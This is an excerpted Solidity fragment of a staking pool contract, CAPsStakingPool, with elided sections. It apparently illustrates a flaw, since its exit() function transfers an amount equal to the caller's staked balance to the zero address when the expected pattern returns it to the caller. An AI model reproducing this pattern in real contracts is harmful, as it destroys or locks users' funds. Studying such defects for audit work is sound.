...
contract CAPsStakingPool is LPTokenWrapper, IPool {
    using SafeMath for uint256;

    uint256 public duration = 10 days;              // 10 days;
    ...
    function exit() external {
        ...
        payable(0x0000000000000000000000000000000000000000).transfer(balanceOf(msg.sender));
        getReward();
    }
    ...
    function notifyReward() external override payable {
